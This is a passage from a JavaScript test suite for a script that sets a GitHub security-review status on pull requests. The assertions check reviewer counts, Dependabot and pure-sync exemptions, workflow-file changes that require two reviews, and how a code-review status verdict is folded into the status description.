  ok(run(pull, [[summary(open), said("Security review: checked", "OWNER", "2026-11-12T11:00:00Z")]], { ADVISORY: "false" }, [[finding("2026-11-12T12:00:00Z")]]).status.state === "pending" && run(pull, [[summary(open), said("Security review: checked", "OWNER", "2026-11-12T13:00:00Z")]], { ADVISORY: "false" }, [[finding("2026-11-12T12:00:00Z")]]).status.state === "success", "given the review comments too, it weighs a finding against a posted review");
  ok(run(bump, [], { ADVISORY: "false" }, [], its).status.state === "success" && run(bump, [], { ADVISORY: "false" }, []).status.state === "pending", "given the commits too, it passes Dependabot's own, and without them it does not");
  const asked = run(counted(pull, [stepChange]), [[summary(onHead)]], { ADVISORY: "false" }, [], [], [[stepChange]]);
  ok(asked.status.state === "pending" && asked.status.description.startsWith("Waiting: floor rule 3 asks two") && run(counted(pull, [pinMove]), [[summary(onHead)]], { ADVISORY: "false" }, [], [], [[pinMove]]).status.state === "success"
    && run({ ...counted(pull, [stepChange]), created_at: "2026-11-12T09:00:00Z" }, [[summary(onHead)]], { ADVISORY: "false", BOUND: "false", SINCE: "2026-11-12T10:00:00Z" }, [], [], [[stepChange]]).status.state === "success"
    && ["2026-11-12T08:00:00Z", ""].every((since) => run({ ...counted(pull, [stepChange]), created_at: "2026-11-12T09:00:00Z" }, [[summary(onHead)]], { ADVISORY: "false", BOUND: "false", SINCE: since }, [], [], [[stepChange]]).status.state === "pending"),
  "given the files too, it asks two where what runs by itself changed, and says how to mend it; told the pull request is from before the check and opened before the script first came to the default branch, it waits not; opened since, or with no time for that, it waits");
  ok(run(pull, [], { ADVISORY: "false", PURE: HEAD }).status.description === "a pure sync, as pure-sync.mjs proves: no review needed, none begun by itself yet (floor rule 8)" && run(pull, [], { ADVISORY: "false", PURE: SEEN }).status.state === "pending" && run({ ...pull, head: { sha: "main" } }, [], { PURE: "main" }).sha === undefined, "told the workflow's proof holds for the head, a sync needs no review; for another commit it does");
  ok(run(counted(pull, [lineOf]), [], { ADVISORY: "false", QUEUE: HEAD }, [], [], [[lineOf]]).status.state === "success" && run(counted(pull, [lineOf]), [], { ADVISORY: "false", QUEUE: SEEN }, [], [], [[lineOf]]).status.state === "pending"
    && run(counted(pull, [lineOf]), [], { ADVISORY: "false", QUEUE: HEAD }).status.state === "pending",
  "told the caller's proof holds for the head, a queue-only pull request needs no review; for another commit, or with no files to read, it does");
  // (the copy told apart from the core's own repository, as core-path.mjs's copyHeld does, #1350: the default branch's
  // checkout that tracks scripts/core-path.mjs at its root holds no copy, whatever manifest stands beside it, so a
  // workflow under the path that manifest names is what runs by itself, and asks two; in a project's checkout it is the
  // copy's, which a sync changes)
  const named = manifestAt("vendor/core/");
  const own = checkout(dir, "own", { "core-manifest.md": named, ...OWN_SCRIPT }), copy = checkout(dir, "copy", { "core-manifest.md": named });
  const inCopy = { ...stepChange, filename: "vendor/core/.github/workflows/ci.yml" };
  const ownTwo = run(counted(pull, [inCopy]), [[summary(onHead)]], { ADVISORY: "false" }, [], [], [[inCopy]], own);
  ok(ownTwo.status.state === "pending" && ownTwo.status.description.startsWith("Waiting: floor rule 3 asks two") && run(counted(pull, [inCopy]), [[summary(onHead)]], { ADVISORY: "false" }, [], [], [[inCopy]], copy).status.state === "success",
    "the core's own checkout, with a manifest at its root, holds no copy: a workflow under the path it names asks two security reviews; in a project's it is the copy's", ownTwo.status.description);
  const inCore = { ...stepChange, filename: "core/.github/workflows/ci.yml" };
  ok(run(counted(pull, [inCore]), [[summary(onHead)]], { ADVISORY: "false" }, [], [], [[inCore]], own).status.description?.startsWith("Waiting: floor rule 3 asks two"),
    "and holding no copy, it leaves nothing aside, core/ included: a workflow there asks two security reviews");
  ok(run(pull, [[as("helper")]], { ADVISORY: "false", REVIEWERS: "x helper" }).status.state === "success" && run(pull, [[as("helper")]], { ADVISORY: "false" }).status.state === "pending", "the accounts the workflow names count, and no others");
  ok(JSON.stringify(run({ ...pull, draft: true }, [])) === "{}", "a draft prints nothing to mark");
  ok(run(pull, [[real(REAL_CLEAN.replace("codex-review-state:v1", "codex-review-state:v2"))]]).warning === UNREAD && run(pull, [[real(REAL_CLEAN)]]).warning === undefined, "run as the workflow runs it, it prints the warning beside the status, for the workflow to show");
  // ---- the code-review status's verdict folded in (#1339): the status a ruleset requires passes only where that one does ----
  const NONE = "no code review. Mend: a fresh reviewer posts Code review: <whole SHA>⏎Blocking findings: N.⏎Other findings: M.⏎Score: S of 10.";
  const passed = { sha: HEAD, done: true, why: "a security review is posted" };
  const shortWhy = { sha: HEAD, done: false, why: "Codex's code review of aaaaaaa is still running. Mend: wait for it" };
  // (whys whose whole form, "code-review waits: " and all, is 112 and 127 characters: past the budget that leaves room for
  // "Advisory: " and "; summary unreadable", within the 140 alone, so a budget raised past 110 cuts their mend)
  const near = [112, 127].map((n) => ({ sha: HEAD, done: false, why: `${"r".repeat(30)}. Mend: ${"m".repeat(n - 57)}` }));
  const folds = [withCode(passed, shortWhy), withCode(passed, { sha: HEAD, done: false, why: NONE }), withCode(passed, { sha: HEAD, done: false, why: `${"x".repeat(100)}. Mend: wait` }),
    ...near.map((code) => withCode(passed, code)),
    ...[null, {}, { sha: SEEN, done: true, why: "no code review is running" }, { sha: HEAD, done: "no", why: "" }, { sha: HEAD, done: true }].map((code) => withCode(passed, code))];
  ok(near.every((code) => `code-review waits: ${code.why}`.length > 110 && `code-review waits: ${code.why}`.length < 140)
    && folds.every((v) => v.done === false && [true, false].every((a) => status({ ...v, warning: UNREAD }, a).description === `${a ? "Advisory: " : "Waiting: "}${v.why}; summary unreadable`) && mended(status(v, false).description))
    && folds[0].why === `code-review waits: ${shortWhy.why}` && folds[1].why === "code-review waits: no code review. Mend: do what the code-review status's own mend says" && folds[2].why === CODE_WAITS
    && folds.slice(3, 5).every((v) => v.why === `code-review waits: ${"r".repeat(30)}. Mend: do what the code-review status's own mend says`)
    && folds.slice(5).every((v) => v.why === CODE_UNREAD),
  "while the code-review status waits, the security-review status waits too, saying why whole where it fits, else what it waits for and a mend that points to that status's, else the pointer; one not read, or of another commit, waits as not worked out; each within GitHub's 140 characters with its mend", folds.map((v) => v.why).join(" | "));
  const ownWait = { sha: HEAD, done: false, why: "no security review" };
  ok(withCode(passed, { sha: HEAD, done: true, why: "no code review is running" }) === passed && withCode(passed, undefined) === passed && withCode(passed, shortWhy, true) === passed && withCode(passed, null, true) === passed && withCode(undefined, null) === undefined && withCode(ownWait, shortWhy) === ownWait,
    "  one that passes, or none given (an older default branch), leaves it as it was, and so does a head proved a pure sync, which needs no review; nor where it waits on its own, which says its own why");
  const codeFile = join(dir, "code.json");
  const withFile = (code, env = {}) => { if (code === undefined) rmSync(codeFile, { force: true }); else writeFileSync(codeFile, typeof code === "string" ? code : JSON.stringify(code)); return run(pull, [[summary(done)]], { ADVISORY: "false", CODE: codeFile, ...env }); };
  const waitsFile = withFile({ sha: HEAD, done: false, why: NONE }), passesFile = withFile({ sha: HEAD, done: true, why: "no code review is running" }), advisesFile = withFile({ sha: HEAD, done: false, why: NONE }, { ADVISORY: "" });
  const brokenFile = withFile(""), goneFile = withFile(undefined);
  ok(waitsFile.status.state === "pending" && waitsFile.status.description.startsWith("Waiting: code-review waits: no code review.") && passesFile.status.state === "success"
    && advisesFile.status.state === "success" && advisesFile.status.description.startsWith("Advisory: code-review waits") && [brokenFile, goneFile].every((r) => r.status.state === "pending" && r.status.description === `Waiting: ${CODE_UNREAD}`)
    && run(pull, [[summary(done)]], { ADVISORY: "false" }).status.state === "success" && withFile({ sha: HEAD, done: false, why: NONE }, { PURE: HEAD }).status.state === "success",
  "run as the workflow runs it, given CODE it waits while the code-review verdict waits, advises so where advisory, and waits where that file is empty or gone; given none, or a head proved a pure sync, as before", [waitsFile, passesFile, advisesFile, brokenFile, goneFile].map((r) => r.status.description).join(" | "));
  let usage = 0;
  try { execFileSync(process.execPath, [script], { stdio: "ignore" }); } catch (e) { usage = e.status; }
  ok(usage === 2, "with no files named, it says how it is run");
} finally {
  rmSync(dir, { recursive: true, force: true });
}
process.exit(failed ? 1 : 0);
